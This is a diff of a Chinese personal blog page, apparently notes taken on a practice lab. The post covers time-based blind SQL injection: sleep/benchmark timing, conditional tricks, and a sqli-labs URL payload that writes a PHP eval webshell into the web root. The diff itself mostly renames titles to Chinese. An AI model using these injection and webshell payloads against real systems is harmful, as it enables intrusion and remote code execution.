@@ -6,26 +6,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>note34 - han个人博客</title>
+    <title>笔记34 - han个人博客</title>
     <meta name="author" content="han">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 盲注之时间盲注\n\n\n\n\n\n\nSQL 盲注sleep(second) 函数12# 系统睡眠3秒，查询结果为0select sleep(3);\n\n时间可以精确控制。\nbenchmark(number, function)函数12# 重复执行某个函数N次select benchmark(10000000, md5(1);\n\n时间不可控，电脑性能越高，时间越短。\n\n\n\nselect * from table where id = 1\nand if(布尔表达式, 0, 1);\n\n\n\n原始语句\n测试语句+注入语句\n\n\n参考文章\n\nMySQL时间盲注五种延时方法 (PWNHUB 非预期解)\n\nand 0 的短路特性1234select * from users where id=1 and 1 and sleep(1);# 1.00secselect * from users where id=1 and 0 and sleep(1);# 0.00 sec\n\n1234select 1 and sleep(3);# 3.00 secselect 0 and sleep(3);# 0.00 sec\n\nor 1 的短路特性1234select * from users where id=1 or 1 or sleep(1);# 0.00 secselect * from users where id=1 or 0 or sleep(1);# 1.00 sec\n\n1234select 1 or sleep(3);# 0.00 secselect 0 or sleep(3);# 3.00 sec\n\n条件语句\nif(布尔语句, 0, 1)\n\n条件成立取 0 ，条件不成立取 1 。\n1234# 睡眠3秒select if(length(version())&gt;1, sleep(3), 0);# 直接返回0select if(length(version())&gt;15, sleep(3), 0);\n\n\ncase [1] when [2] then [3] else [4] end\n\n当 [1] 的值与 [2] 的值相等时，取 [3]，否则取 [4]\n12select case 1=1 when 1 then 123 else 456 end;# 123\n\nor 的影响\n12select * from users where id=&apos;1&apos; or sleep(3); #&apos;;# 1 row in set (36.01 sec)\n\n注意：sleep是存在一个满足条件的行就会延迟指定的时间，比如 sleep(5)，但实际上查找到两个满足条件的行，那么就会延迟 10s ，在真实的渗透测试过程中，我们有时候不清楚整个表的情况，可以用 sleep(0.001)看最后多少秒有结果，推断表的行数。\n参考文章\n\n一篇文章带你深入理解 SQL 盲注\n\n用 SQL 注入写webshell1http://192.168.100.197/Less-1/?id=1&apos; union select 1,2, &apos;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&apos; into outfile &apos;/var/www/html/case.txt&apos; --+\n\n注意权限问题，此时创建文件的用户是 mysql\n防止 SQL 注入常用函数addslashes()和 mysql_real_escape_string()\n详细内容请访问：\nPHP内置过滤函数\n寻找 SQL 注入点思路\n","dateCreated":"2019-08-29T19:49:36+08:00","dateModified":"2019-08-30T08:16:16+08:00","datePublished":"2019-08-29T19:49:36+08:00","description":"Abstract: SQL 盲注之时间盲注","headline":"note34","image":["https://images.pexels.com/photos/2819353/pexels-photo-2819353.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/29/note34/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/29/note34/","keywords":"SQL 盲注","thumbnailUrl":"https://images.pexels.com/photos/2819353/pexels-photo-2819353.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 盲注之时间盲注\n\n\n\n\n\n\nSQL 盲注sleep(second) 函数12# 系统睡眠3秒，查询结果为0select sleep(3);\n\n时间可以精确控制。\nbenchmark(number, function)函数12# 重复执行某个函数N次select benchmark(10000000, md5(1);\n\n时间不可控，电脑性能越高，时间越短。\n\n\n\nselect * from table where id = 1\nand if(布尔表达式, 0, 1);\n\n\n\n原始语句\n测试语句+注入语句\n\n\n参考文章\n\nMySQL时间盲注五种延时方法 (PWNHUB 非预期解)\n\nand 0 的短路特性1234select * from users where id=1 and 1 and sleep(1);# 1.00secselect * from users where id=1 and 0 and sleep(1);# 0.00 sec\n\n1234select 1 and sleep(3);# 3.00 secselect 0 and sleep(3);# 0.00 sec\n\nor 1 的短路特性1234select * from users where id=1 or 1 or sleep(1);# 0.00 secselect * from users where id=1 or 0 or sleep(1);# 1.00 sec\n\n1234select 1 or sleep(3);# 0.00 secselect 0 or sleep(3);# 3.00 sec\n\n条件语句\nif(布尔语句, 0, 1)\n\n条件成立取 0 ，条件不成立取 1 。\n1234# 睡眠3秒select if(length(version())&gt;1, sleep(3), 0);# 直接返回0select if(length(version())&gt;15, sleep(3), 0);\n\n\ncase [1] when [2] then [3] else [4] end\n\n当 [1] 的值与 [2] 的值相等时，取 [3]，否则取 [4]\n12select case 1=1 when 1 then 123 else 456 end;# 123\n\nor 的影响\n12select * from users where id=&apos;1&apos; or sleep(3); #&apos;;# 1 row in set (36.01 sec)\n\n注意：sleep是存在一个满足条件的行就会延迟指定的时间，比如 sleep(5)，但实际上查找到两个满足条件的行，那么就会延迟 10s ，在真实的渗透测试过程中，我们有时候不清楚整个表的情况，可以用 sleep(0.001)看最后多少秒有结果，推断表的行数。\n参考文章\n\n一篇文章带你深入理解 SQL 盲注\n\n用 SQL 注入写webshell1http://192.168.100.197/Less-1/?id=1&apos; union select 1,2, &apos;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&apos; into outfile &apos;/var/www/html/case.txt&apos; --+\n\n注意权限问题，此时创建文件的用户是 mysql\n防止 SQL 注入常用函数addslashes()和 mysql_real_escape_string()\n详细内容请访问：\nPHP内置过滤函数\n寻找 SQL 注入点思路\n","dateCreated":"2019-08-29T19:49:36+08:00","dateModified":"2019-09-09T13:38:37+08:00","datePublished":"2019-08-29T19:49:36+08:00","description":"Abstract: SQL 盲注之时间盲注","headline":"笔记34","image":["https://images.pexels.com/photos/2819353/pexels-photo-2819353.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/29/note34/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/29/note34/","keywords":"SQL 盲注","thumbnailUrl":"https://images.pexels.com/photos/2819353/pexels-photo-2819353.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"}</script>
     <meta name="description" content="Abstract: SQL 盲注之时间盲注">
 <meta name="keywords" content="SQL 盲注">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="note34">
+<meta property="og:title" content="笔记34">
 <meta property="og:url" content="http://yoursite.com/2019/08/29/note34/index.html">
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: SQL 盲注之时间盲注">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/images/139sqlinjec.png">
-<meta property="og:updated_time" content="2019-08-30T00:16:16.168Z">
+<meta property="og:updated_time" content="2019-09-09T05:38:37.527Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="note34">
+<meta name="twitter:title" content="笔记34">
 <meta name="twitter:description" content="Abstract: SQL 盲注之时间盲注">
 <meta name="twitter:image" content="http://yoursite.com/images/139sqlinjec.png">
     
@@ -263,7 +263,7 @@
         <div class="post-header main-content-wrap text-center">
     
         <h1 class="post-title">
-            note34
+            笔记34
         </h1>
     
     
@@ -377,8 +377,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/30/note35/"
-                    data-tooltip="note35"
-                    aria-label="PREVIOUS: note35"
+                    data-tooltip="笔记35"
+                    aria-label="PREVIOUS: 笔记35"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -492,8 +492,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/30/note35/"
-                    data-tooltip="note35"
-                    aria-label="PREVIOUS: note35"
+                    data-tooltip="笔记35"
+                    aria-label="PREVIOUS: 笔记35"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -695,7 +695,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
                         </a>
@@ -705,9 +705,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
-                            <h3 class="media-heading">dvwa-deploy</h3>
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -760,8 +760,8 @@
                     <div class="media-left">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
                         </a>
@@ -770,10 +770,10 @@
                     <div class="media-body">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
-                            <h3 class="media-heading">note11</h3>
+                            <h3 class="media-heading">笔记11</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -795,7 +795,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -805,9 +805,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
-                            <h3 class="media-heading">week2sum</h3>
+                            <h3 class="media-heading">第二周总结</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -816,7 +816,7 @@
                                 
                             </span>
                         </span>
-                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
                     </div>
                     <div style="clear:both;"></div>
                     <hr>
@@ -894,7 +894,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
                         </a>
@@ -904,9 +904,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
-                            <h3 class="media-heading">note12</h3>
+                            <h3 class="media-heading">笔记12</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -927,7 +927,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
                         </a>
@@ -937,9 +937,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
-                            <h3 class="media-heading">note13</h3>
+                            <h3 class="media-heading">笔记13</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -960,7 +960,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
                             <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                         </a>
@@ -970,9 +970,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
-                            <h3 class="media-heading">note14</h3>
+                            <h3 class="media-heading">笔记14</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -993,7 +993,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -1003,9 +1003,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
-                            <h3 class="media-heading">note15</h3>
+                            <h3 class="media-heading">笔记15</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
